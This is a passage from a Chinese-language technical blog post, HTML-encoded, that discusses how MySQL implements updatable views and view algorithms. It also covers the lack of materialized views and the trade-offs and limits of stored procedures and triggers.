;&#x9002;&#x7684;&#x6761;&#x4EF6;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x66F4;&#x65B0;&#x3001;&#x5220;&#x9664;&#x751A;&#x81F3;&#x662F;&#x5411;&#x89C6;&#x56FE;&#x4E2D;&#x63D2;&#x5165;&#x6570;&#x636E;&#x3002;&#x901A;&#x8FC7;&#x4E0A;&#x6587;&#x7684;&#x4E86;&#x89E3;&#xFF0C;&#x4E0D;&#x96BE;&#x63A8;&#x65AD;&#x51FA;&#xFF1A;&#x66F4;&#x65B0;&#x89C6;&#x56FE;&#x7684;&#x5B9E;&#x8D28;&#x5C31;&#x662F;&#x66F4;&#x65B0;&#x89C6;&#x56FE;&#x5173;&#x8054;&#x7684;&#x8868;&#xFF0C;&#x5C06;&#x521B;&#x5EFA;&#x89C6;&#x56FE;&#x7684;WHERE&#x5B50;&#x53E5;&#x8F6C;&#x5316;&#x4E3A;UPDATE&#x8BED;&#x53E5;&#x7684;WHERE&#x5B50;&#x53E5;&#xFF0C;&#x53EA;&#x6709;&#x4F7F;&#x7528;&#x5408;&#x5E76;&#x7B97;&#x6CD5;&#x7684;&#x89C6;&#x56FE;&#x624D;&#x80FD;&#x66F4;&#x65B0;&#xFF0C;&#x5E76;&#x4E14;&#x66F4;&#x65B0;&#x7684;&#x5217;&#x5FC5;&#x987B;&#x6765;&#x81EA;&#x540C;&#x4E00;&#x4E2A;&#x8868;&#x4E2D;&#x3002;&#x56DE;&#x987E;&#x4E0A;&#x6587;&#x521B;&#x5EFA;&#x89C6;&#x56FE;&#x7684; SQL &#x8BED;&#x53E5;&#xFF0C;&#x5176;&#x4E2D;&#x6709;&#x4E00;&#x53E5;&#xFF1A;WITH CHECK OPTION&#xFF0C;&#x5176;&#x4F5C;&#x7528;&#x5C31;&#x662F;&#x8868;&#x793A;&#x901A;&#x8FC7;&#x89C6;&#x56FE;&#x66F4;&#x65B0;&#x7684;&#x884C;&#xFF0C;&#x90FD;&#x5FC5;&#x987B;&#x7B26;&#x5408;&#x89C6;&#x56FE;&#x672C;&#x8EAB;&#x7684;WHERE&#x6761;&#x4EF6;&#x5B9A;&#x4E49;&#xFF0C;&#x4E0D;&#x80FD;&#x66F4;&#x65B0;&#x89C6;&#x56FE;&#x5B9A;&#x4E49;&#x5217;&#x4EE5;&#x5916;&#x7684;&#x5217;&#xFF0C;&#x5426;&#x5219;&#x5C31;&#x4F1A;&#x629B;&#x51FA;check option failed&#x9519;&#x8BEF;&#x3002;</p><p>&#x89C6;&#x56FE;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x5BB9;&#x6613;&#x9020;&#x6210;&#x8BEF;&#x89E3;&#x7684;&#x5730;&#x65B9;&#xFF1A;&#x201C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E9B;&#x7B80;&#x5355;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x89C6;&#x56FE;&#x4F1A;&#x4F7F;&#x7528;&#x5408;&#x5E76;&#x7B97;&#x6CD5;&#xFF0C;&#x800C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E9B;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x89C6;&#x56FE;&#x5C31;&#x4F1A;&#x4F7F;&#x7528;&#x4E34;&#x65F6;&#x8868;&#x7B97;&#x6CD5;&#x201D;&#x3002;&#x4F46;&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;&#x89C6;&#x56FE;&#x7684;&#x5B9E;&#x73B0;&#x7B97;&#x6CD5;&#x662F;&#x89C6;&#x56FE;&#x672C;&#x8EAB;&#x7684;&#x5C5E;&#x6027;&#x51B3;&#x5B9A;&#x7684;&#xFF0C;&#x8DDF;&#x4F5C;&#x7528;&#x5728;&#x89C6;&#x56FE;&#x4E0A;&#x7684; SQL &#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x5173;&#x7CFB;&#x3002;&#x90A3;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x89C6;&#x56FE;&#x91C7;&#x7528;&#x4E34;&#x65F6;&#x8868;&#x7B97;&#x6CD5;&#xFF0C;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x91C7;&#x7528;&#x5408;&#x5E76;&#x7B97;&#x6CD5;&#x5462;&#xFF1F;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;&#x53EA;&#x8981;&#x539F;&#x8868;&#x8BB0;&#x5F55;&#x548C;&#x89C6;&#x56FE;&#x4E2D;&#x7684;&#x8BB0;&#x5F55;&#x65E0;&#x6CD5;&#x5EFA;&#x7ACB;&#x4E00;&#x4E00;&#x6620;&#x5C04;&#x7684;&#x5173;&#x7CFB;&#x65F6;&#xFF0C;MySQL &#x90FD;&#x5C06;&#x4F7F;&#x7528;&#x4E34;&#x65F6;&#x8868;&#x7B97;&#x6CD5;&#x6765;&#x5B9E;&#x73B0;&#x89C6;&#x56FE;&#x3002;&#x6BD4;&#x5982;&#x521B;&#x5EFA;&#x89C6;&#x56FE;&#x7684; SQL &#x4E2D;&#x5305;&#x542B;GROUP BY&#x3001;DISTINCT&#x3001;UNION&#x3001;&#x805A;&#x5408;&#x51FD;&#x6570;&#x3001;&#x5B50;&#x67E5;&#x8BE2;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x89C6;&#x56FE;&#x90FD;&#x5C06;&#x91C7;&#x7528;&#x4E34;&#x65F6;&#x8868;&#x7B97;&#x6CD5;&#xFF08;&#x8FD9;&#x4E9B;&#x89C4;&#x5219;&#x5728;&#x4EE5;&#x540E;&#x7684;&#x7248;&#x672C;&#x4E2D;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x53D1;&#x751F;&#x6539;&#x53D8;&#xFF0C;&#x5177;&#x4F53;&#x8BF7;&#x53C2;&#x8003;&#x5B98;&#x65B9;&#x624B;&#x518C;&#xFF09;&#x3002;</p><p>&#x76F8;&#x6BD4;&#x4E8E;&#x5176;&#x5B83;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x7684;&#x89C6;&#x56FE;&#xFF0C;MySQL &#x7684;&#x89C6;&#x56FE;&#x5728;&#x529F;&#x80FD;&#x4E0A;&#x4F1A;&#x5F31;&#x5F88;&#x591A;&#xFF0C;&#x6BD4;&#x5982;ORACLE&#x548C;MS SQL SERVER&#x90FD;&#x652F;&#x6301;&#x7269;&#x5316;&#x89C6;&#x56FE;&#x3002;&#x7269;&#x5316;&#x89C6;&#x56FE;&#x662F;&#x6307;&#x5C06;&#x89C6;&#x56FE;&#x7ED3;&#x679C;&#x6570;&#x636E;&#x5B58;&#x653E;&#x5728;&#x4E00;&#x4E2A;&#x53EF;&#x4EE5;&#x67E5;&#x8BE2;&#x7684;&#x8868;&#x4E2D;&#xFF0C;&#x5E76;&#x5B9A;&#x671F;&#x4ECE;&#x539F;&#x59CB;&#x8868;&#x4E2D;&#x5237;&#x65B0;&#x6570;&#x636E;&#x5230;&#x8FD9;&#x5F20;&#x8868;&#x4E2D;&#xFF0C;&#x8FD9;&#x5F20;&#x8868;&#x548C;&#x666E;&#x901A;&#x7269;&#x7406;&#x8868;&#x4E00;&#x6837;&#xFF0C;&#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x7D22;&#x5F15;&#x3001;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x7B49;&#x7B49;&#xFF0C;&#x6027;&#x80FD;&#x76F8;&#x6BD4;&#x4E8E;&#x4E34;&#x65F6;&#x8868;&#x4F1A;&#x6709;&#x8D28;&#x7684;&#x63D0;&#x5347;&#x3002;&#x4F46;&#x9057;&#x61BE;&#x7684;&#x662F; MySQL &#x76EE;&#x524D;&#x5E76;&#x4E0D;&#x652F;&#x6301;&#x7269;&#x5316;&#x89C6;&#x56FE;&#xFF0C;&#x5F53;&#x7136; MySQL &#x4E5F;&#x4E0D;&#x652F;&#x6301;&#x5728;&#x89C6;&#x56FE;&#x4E2D;&#x521B;&#x5EFA;&#x7D22;&#x5F15;&#x3002;</p><h4 id="&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x4E0E;&#x89E6;&#x53D1;&#x5668;"><a href="#&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x4E0E;&#x89E6;&#x53D1;&#x5668;" class="headerlink" title="&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x4E0E;&#x89E6;&#x53D1;&#x5668;"></a>&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x4E0E;&#x89E6;&#x53D1;&#x5668;</h4><p>&#x56DE;&#x5230;&#x7B2C;&#x4E8C;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x6709;&#x975E;&#x5E38;&#x591A;&#x7684;&#x4EBA;&#x5728;&#x5206;&#x4EAB;&#x65F6;&#x90FD;&#x4F1A;&#x629B;&#x51FA;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x89C2;&#x70B9;&#xFF1A;&#x5C3D;&#x53EF;&#x80FD;&#x4E0D;&#x8981;&#x4F7F;&#x7528;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#xFF0C;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x975E;&#x5E38;&#x4E0D;&#x5BB9;&#x6613;&#x7EF4;&#x62A4;&#xFF0C;&#x4E5F;&#x4F1A;&#x589E;&#x52A0;&#x4F7F;&#x7528;&#x6210;&#x672C;&#xFF0C;&#x5E94;&#x8BE5;&#x628A;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#x653E;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x65E2;&#x7136;&#x5BA2;&#x6237;&#x7AEF;&#x90FD;&#x80FD;&#x5E72;&#x8FD9;&#x4E9B;&#x4E8B;&#xFF0C;&#x90A3;&#x4E3A;&#x4EC0;&#x4E48;&#x8FD8;&#x8981;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#xFF1F;</p><p>&#x5982;&#x679C;&#x6709;&#x6DF1;&#x5165;&#x4E86;&#x89E3;&#x8FC7;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#xFF0C;&#x5C31;&#x4F1A;&#x53D1;&#x73B0;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x5E76;&#x6CA1;&#x6709;&#x5927;&#x5BB6;&#x63CF;&#x8FF0;&#x7684;&#x90A3;&#x4E48;&#x4E0D;&#x582A;&#x3002;&#x6211;&#x66FE;&#x7ECF;&#x7ECF;&#x5386;&#x8FC7;&#x4E00;&#x4E9B;&#x91CD;&#x5EA6;&#x4F7F;&#x7528;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x7684;&#x4EA7;&#x54C1;&#xFF0C;&#x4F9D;&#x8D56;&#x5230;&#x4EC0;&#x4E48;&#x7A0B;&#x5EA6;&#x5462;&#xFF1F;&#x5C31;&#x8FD9;&#x4E48;&#x8BF4;&#x5427;&#xFF0C;&#x4E0A;&#x5C42;&#x7684;&#x5E94;&#x7528;&#x57FA;&#x672C;&#x4E0A;&#x53EA;&#x5904;&#x7406;&#x4EA4;&#x4E92;&#x4E0E;&#x52A8;&#x6548;&#x7684;&#x903B;&#x8F91;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#xFF0C;&#x751A;&#x81F3;&#x662F;&#x53C2;&#x6570;&#x7684;&#x6821;&#x9A8C;&#x5747;&#x5728;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x4E2D;&#x5B9E;&#x73B0;&#x3002;&#x66FE;&#x7ECF;&#x6709;&#x51FA;&#x73B0;&#x8FC7;&#x4E00;&#x4E2A;&#x8D85;&#x5927;&#x7684;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#xFF0C;&#x5176;&#x6587;&#x4EF6;&#x5927;&#x5C0F;&#x8FBE;&#x5230;&#x60CA;&#x4EBA;&#x7684; 80K&#xFF0C;&#x53EF;&#x60F3;&#x800C;&#x77E5;&#xFF0C;&#x5176;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#x6709;&#x591A;&#x4E48;&#x590D;&#x6742;&#x3002;&#x5728;&#x5927;&#x591A;&#x6570;&#x4EBA;&#x773C;&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x6280;&#x672F;&#x67B6;&#x6784;&#x7B80;&#x76F4;&#x6709;&#x70B9;&#x4E0D;&#x53EF;&#x7406;&#x55BB;&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x4E0A;&#x8FD9;&#x6B3E;&#x4EA7;&#x54C1;&#x975E;&#x5E38;&#x6210;&#x529F;&#x3002;</p><p>&#x5176;&#x6210;&#x529F;&#x7684;&#x539F;&#x56E0;&#x5728;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x5F97;&#x76CA;&#x4E8E;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x7684;&#x4F18;&#x70B9;&#xFF0C;&#x7531;&#x4E8E;&#x4E1A;&#x52A1;&#x5C42;&#x4EE3;&#x7801;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x4FB5;&#x5165;&#x4E1A;&#x52A1;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x5728;&#x4E0D;&#x6539;&#x53D8;&#x524D;&#x7AEF;&#x5C55;&#x793A;&#x6548;&#x679C;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x975E;&#x5E38;&#x5FEB;&#x901F;&#x7684;&#x4FEE;&#x590D; BUG&#x3001;&#x5F00;&#x53D1;&#x65B0;&#x529F;&#x80FD;&#x3002;&#x7531;&#x4E8E;&#x8FD9;&#x6B3E;&#x4EA7;&#x54C1;&#x9700;&#x8981;&#x90E8;&#x7F72;&#x5728;&#x5BA2;&#x6237;&#x7684;&#x79C1;&#x6709;&#x73AF;&#x5883;&#x4E0A;&#xFF0C;&#x5FEB;&#x901F;&#x54CD;&#x5E94;&#x5BA2;&#x6237;&#x7684;&#x9700;&#x6C42;&#x5C31;&#x53D8;&#x5F97;&#x5C24;&#x4E3A;&#x91CD;&#x8981;&#xFF0C;&#x6B63;&#x662F;&#x5F97;&#x76CA;&#x4E8E;&#x8FD9;&#x79CD;&#x67B6;&#x6784;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x5BA2;&#x6237;&#x51FA;&#x73B0;&#x95EE;&#x9898;&#x6216;&#x8005;&#x63D0;&#x51FA;&#x65B0;&#x9700;&#x6C42;&#x65F6;&#xFF0C;&#x5FEB;&#x901F;&#x54CD;&#x5E94;&#xFF0C;&#x6781;&#x7AEF;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728; 1 &#x5C0F;&#x65F6;&#x5185;&#x4FEE;&#x590D;&#x5BA2;&#x6237;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;&#x3002;&#x6B63;&#x662F;&#x8FD9;&#x79CD;&#x5FEB;&#x901F;&#x54CD;&#x5E94;&#x673A;&#x5236;&#xFF0C;&#x8BA9;&#x6211;&#x4EEC;&#x83B7;&#x5F97;&#x5927;&#x91CF;&#x7684;&#x5BA2;&#x6237;&#x3002;</p><p>&#x5F53;&#x7136;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x8FD8;&#x6709;&#x5176;&#x4ED6;&#x7684;&#x4F18;&#x70B9;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;&#x53EF;&#x4EE5;&#x975E;&#x5E38;&#x65B9;&#x4FBF;&#x7684;&#x52A0;&#x5BC6;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x4EE3;&#x7801;&#xFF0C;&#x800C;&#x4E0D;&#x7528;&#x62C5;&#x5FC3;&#x5E94;&#x7528;&#x90E8;&#x7F72;&#x5230;&#x79C1;&#x6709;&#x73AF;&#x5883;&#x9020;&#x6210;&#x6E90;&#x4EE3;&#x7801;&#x6CC4;&#x9732;&#x3001;&#x53EF;&#x4EE5;&#x50CF;&#x8C03;&#x8BD5;&#x5176;&#x4ED6;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E00;&#x6837;&#x8C03;&#x8BD5;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x3001;&#x53EF;&#x4EE5;&#x8BBE;&#x5B9A;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x7684;&#x4F7F;&#x7528;&#x6743;&#x9650;&#x6765;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x5B89;&#x5168;&#x7B49;&#x7B49;&#x3002;&#x4E00;&#x5207;&#x90FD;&#x975E;&#x5E38;&#x7F8E;&#x597D;&#xFF0C;&#x4F46;&#x6211;&#x4EEC;&#x7684;&#x4EA7;&#x54C1;&#x662F;&#x57FA;&#x4E8E;MS SQL SERVER&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x5176;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;T-SQL&#x975E;&#x5E38;&#x65B9;&#x4FBF;&#x7684;&#x5B9E;&#x73B0;&#x590D;&#x6742;&#x7684;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#x3002;&#x4F60;&#x53EF;&#x4EE5;&#x628A;T-SQL&#x770B;&#x505A;&#x662F;&#x4E00;&#x95E8;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#xFF0C;&#x5176;&#x5305;&#x542B;SQL&#x7684;&#x6240;&#x6709;&#x529F;&#x80FD;&#xFF0C;&#x8FD8;&#x5177;&#x5907;&#x6D41;&#x7A0B;&#x63A7;&#x5236;&#x3001;&#x6279;&#x5904;&#x7406;&#x3001;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#x7B49;&#x80FD;&#x529B;&#xFF0C;&#x4F60;&#x751A;&#x81F3;&#x53EF;&#x4EE5;&#x7528;&#x5176;&#x6765;&#x89E3;&#x6790; XML &#x6570;&#x636E;&#x3002;&#x5173;&#x4E8E;T-SQL&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#x53EF;&#x4EE5;&#x53C2;&#x8003;MSDN&#xFF0C;&#x4E3B;&#x6D41;&#x7684;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x76EE;&#x524D;&#x53EA;&#x6709;MS SQL SERVER&#x652F;&#x6301;T-SQL&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;MySQL &#x5E76;&#x4E0D;&#x5177;&#x5907;&#x4E0A;&#x6587;&#x63CF;&#x8FF0;&#x7684;&#x4E00;&#x4E9B;&#x80FD;&#x529B;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;MySQL &#x7684;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x8C03;&#x8BD5;&#x975E;&#x5E38;&#x4E0D;&#x65B9;&#x4FBF;&#xFF08;&#x5F53;&#x7136;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4ED8;&#x8D39;&#x8F6F;&#x4EF6;&#x6765;&#x83B7;&#x5F97;&#x5F88;&#x597D;&#x7684;&#x652F;&#x6301;&#xFF09;&#x3002;</p><p>&#x9664;&#x6B64;&#x4E4B;&#x5916;&#xFF0C;MySQL &#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x7684;&#x9650;&#x5236;&#xFF1A;</p><ul><li>&#x4F18;&#x5316;&#x5668;&#x65E0;&#x6CD5;&#x8BC4;&#x4F30;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x7684;&#x6267;&#x884C;&#x6210;&#x672C;</li><li>&#x6BCF;&#x4E2A;&#x8FDE;&#x63A5;&#x90FD;&#x6709;&#x72EC;&#x7ACB;&#x7684;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x6267;&#x884C;&#x8BA1;&#x5212;&#x7F13;&#x5B58;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x591A;&#x4E2A;&#x8FDE;&#x63A5;&#x9700;&#x8981;&#x8C03;&#x7528;&#x540C;&#x4E00;&#x4E2A;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#xFF0C;&#x5C06;&#x4F1A;&#x6D6A;&#x8D39;&#x7F13;&#x5B58;&#x7A7A;&#x95F4;&#x6765;&#x7F13;&#x5B58;&#x76F8;&#x540C;&#x7684;&#x6267;&#x884C;&#x8BA1;&#x5212;</li></ul><p>&#x56E0;&#x6B64;&#xFF0C;&#x5728; MySQL &#x4E2D;&#x4F7F;&#x7528;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x5E76;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x592A;&#x597D;&#x7B56;&#x7565;&#xFF0C;&#x7279;&#x522B;&#x662F;&#x5728;&#x4E00;&#x4E9B;&#x5927;&#x6570;&#x636E;&#x3001;&#x9AD8;&#x5E76;&#x53D1;&#x7684;&#x573A;&#x666F;&#x4E0B;&#xFF0C;&#x5C06;&#x590D;&#x6742;&#x7684;&#x903B;&#x8F91;&#x4EA4;&#x7ED9;&#x4E0A;&#x5C42;&#x5E94;&#x7528;&#x5B9E;&#x73B0;&#xFF0C;&#x53EF;&#x4EE5;&#x975E;&#x5E38;&#x65B9;&#x4FBF;&#x7684;&#x6269;&#x5C55;&#x5DF2;&#x6709;&#x8D44;&#x6E90;&#x4EE5;&#x4FBF;&#x83B7;&#x5F97;&#x66F4;&#x9AD8;&#x7684;&#x8BA1;&#x7B97;&#x80FD;&#x529B;&#x3002;&#x800C;&#x4E14;&#x5BF9;&#x4E8E;&#x719F;&#x6089;&#x7684;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#xFF0C;&#x5176;&#x53EF;&#x8BFB;&#x6027;&#x4F1A;&#x6BD4;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x66F4;&#x597D;&#x4E00;&#x4E9B;&#xFF0C;&#x4E5F;&#x66F4;&#x52A0;&#x7075;&#x6D3B;&#x3002;&#x4E0D;&#x8FC7;&#xFF0C;&#x5728;&#x67D0;&#x4E9B;&#x573A;&#x666F;&#x4E0B;&#xFF0C;&#x5982;&#x679C;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x6BD4;&#x5176;&#x4ED6;&#x5B9E;&#x73B0;&#x4F1A;&#x5FEB;&#x5F88;&#x591A;&#xFF0C;&#x5E76;&#x4E14;&#x662F;&#x4E00;&#x4E9B;&#x8F83;&#x5C0F;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x4EE5;&#x9002;&#x5F53;&#x8003;&#x8651;&#x4F7F;&#x7528;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x3002;</p><p>&#x548C;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x7C7B;&#x4F3C;&#x7684;&#xFF0C;&#x8FD8;&#x6709;&#x89E6;&#x53D1;&#x5668;&#xFF0C;&#x89E6;&#x53D1;&#x5668;&#x53EF;&#x4EE5;&#x8BA9;&#x4F60;&#x5728;&#x6267;&#x884C;INSERT&#x3001;UPDATE&#x548C;DELETE&#x65F6;&#xFF0C;&#x6267;&#x884C;&#x4E00;&#x4E9B;&#x7279;&#x5B9A;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x5728; MySQL &#x4E2D;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x5728; SQL &#x6267;&#x884C;&#x4E4B;&#x524D;&#x89E6;&#x53D1;&#x8FD8;&#x662F;&#x5728; SQL &#x6267;&#x884C;&#x540E;&#x89E6;&#x53D1;&#x3002;&#x89E6;&#x53D1;&#x5668;&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x5B9E;&#x73B0;&#x4E00;&#x4E9B;&#x5F3A;&#x5236;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x8FD9;&#x4E9B;&#x9650;&#x5236;&#x5982;&#x679C;&#x5728;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#x5B9E;&#x73B0;&#x4F1A;&#x8BA9;&#x4E1A;&#x52A1;&#x4EE3;&#x7801;&#x53D8;&#x5F97;&#x975E;&#x5E38;&#x590D;&#x6742;&#xFF0C;&#x800C;&#x4E14;&#x5B83;&#x4E5F;&#x53EF;&#x4EE5;&#x51CF;&#x5C11;&#x5BA2;&#x6237;&#x7AEF;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#x3002;MySQL &#x89E6;&#x53D1;&#x5668;&#x7684;&#x5B9E;&#x73B0;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x6240;&#x4EE5;&#x529F;&#x80FD;&#x975E;&#x5E38;&#x6709;&#x9650;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x5728;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#x4EA7;&#x54C1;&#x4E2D;&#x5DF2;&#x7ECF;&#x91CD;&#x5EA6;&#x4F9D;&#x8D56;&#x89E6;&#x53D1;&#x5668;&#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x4F7F;&#x7528; MySQL &#x89E6;&#x53D1;&#x5668;&#x65F6;&#x5019;&#x9700;&#x8981;&#x6CE8;&#x610F;&#xFF0C;&#x56E0;&#x4E3A; MySQL &#x89E6;&#x53D1;&#x5668;&#x7684;&#x8868;&#x73B0;&#x548C;&#x9884;&#x60F3;&#x7684;&#x4E0D;&#x4E00;&#x81F4;&#x3002;</p><p>&#x9996;&#x5148;&#x5BF9;&#x4E00;&#x5F20;&#x8868;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x4E8B;&#x4EF6;&#xFF0C;&#x6700;&#x591A;&#x53EA;&#x80FD;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x89E6;&#x53D1;&#x5668;&#xFF0C;&#x800C;&#x4E14;&#x5B83;&#x53EA;&#x652F;&#x6301; &#x201C;&#x57FA;&#x4E8E;&#x884C;&#x7684;&#x89E6;&#x53D1;&#x201D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x89E6;&#x53D1;&#x5668;&#x59CB;&#x7EC8;&#x662F;&#x9488;&#x5BF9;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#x7684;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x9488;&#x5BF9;&#x6574;&#x4E2A; SQL &#x8BED;&#x53E5;&#x3002;&#x5982;&#x679C;&#x662F;&#x6279;&#x91CF;&#x66F4;&#x65B0;&#x7684;&#x8BDD;&#xFF0C;&#x6548;&#x7387;&#x53EF;&#x80FD;&#x4F1A;&#x5F88;&#x4F4E;&#x3002;&#x5176;&#x6B21;&#xFF0C;&#x89E6;&#x53D1;&#x5668;&#x53EF;&#x4EE5;&#x63A9;&#x76D6;&#x670D;&#x52A1;&#x5668;&#x672C;&#x8D28;&#x5DE5;&#x4F5C;&#xFF0C;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684; SQL &#x8BED;&#x53E5;&#x80CC;&#x540E;&#xFF0C;&#x56E0;&#x4E3A;&#x89E6;&#x53D1;&#x5668;&#xFF0C;&#x53EF;&#x80FD;&#x5305;&#x542B;&#x4E86;&#x5F88;&#x591A;&#x770B;&#x4E0D;&#x89C1;&#x7684;&#x5DE5;&#x4F5C;&#x3002;&#x518D;&#x8005;&#xFF0C;&#x89E6;&#x53D1;&#x5668;&#x51FA;&#x73B0;&#x95EE;&#x9898;&#x65F6;&#x5F88;&#x96BE;&#x6392;&#x67E5;&#x3002;&#x6700;&#x540E;&#xFF0C;&#x89E6;&#x53D1;&#x5668;&#x5E76;&#x4E0D;&#x4E00;&#x5B9A;&#x80FD;&#x4FDD;&#x8BC1;&#x539F;&#x5B50;&#x6027;&#xFF0C;&#x6BD4;&#x5982;MyISAM&#x5F15;&#x64CE;&#x4E0B;&#x89E6;&#x53D1;&#x5668;&#x6267;&#x884C;&#x5931;&#x8D25;&#x4E86;&#xFF0C;&#x4E5F;&#x4E0D;&#x80FD;&#x56DE;&#x6EDA;&#x3002;&#x5728;InnoDB&#x8868;&#x4E0A;&#x7684;&#x89E6;&#x53D1;&#x5668;&#x662F;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x4E2D;&#x6267;&#x884C;&#x5B8C;&#x6210;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x4ED6;&#x4EEC;&#x7684;&#x6267;&#x884C;&#x662F;&#x539F;&#x5B50;&#x7684;&#xFF0C;&#x539F;&#x64CD;&#x4F5C;&#x548C;&#x89E6;&#x53D1;&#x5668;&#x64CD;&#x4F5C;&#x4F1A;&#x540C;&#x65F6;&#x5931;&#x8D25;&#x6216;&#x8005;&#x6210;&#x529F;&#x3002;</p><p>&#x867D;&#x7136;&#x89E6;&#x53D1;&#x5668;&#x6709;&#x8FD9;&#x4E48;&#x591A;&#x9650;&#x5236;&#xFF0C;&#x4F46;&#x5B83;&#x4ECD;&#x6709;&#x9002;&#x7528;&#x7684;&#x573A;&#x666F;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;&#x5F53;&#x4F60;&#x9700;&#x8981;&#x8BB0;&#x5F55; MySQL &#x6570;&#x636E;&#x7684;&#x53D8;&#x66F4;&#x65E5;&#x5FD7;&#xFF0C;&#x8FD9;&#x65F6;&#x89E6;&#x53D1;&#x5668;&#x5C31;&#x975E;&#x5E38;&#x65B9;&#x4FBF;&#x4E86;&#x3002;</p><h4 id="&#x5916;&#x952E;&#x7EA6;&#x675F;"><a href="#&#x5916;&#x952E;&#x7EA6;&#x675F;" class="headerlink" 